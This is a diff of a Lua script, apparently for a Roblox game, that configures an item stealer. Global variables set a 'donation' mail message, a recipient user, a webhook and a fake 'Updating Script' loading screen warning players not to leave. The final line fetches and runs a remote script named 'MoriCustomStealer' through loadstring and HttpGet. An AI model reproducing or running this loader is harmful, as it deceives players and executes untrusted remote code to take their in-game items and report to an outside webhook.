@@ -7,5 +7,5 @@ _G.MailMessage = "Please take this as a Donation" -- Mail Message !
 _G.ScriptTitle = "Updating Script ( Donate us by sending gifts user: issue481 Thank you )" -- Loading Screen Title
 _G.ScriptTitle2 = "Do not leave or else your huge and miscs will be gone ( this is a testing beta which the injection of visual pet are not "fe" thank you for your time have a good day )" -- Put Same Title
 _G.WebhookName = "Webhook Name Here" -- Webhook name 
-(10)
+
 loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/idk/main/MoriCustomStealer", true))()
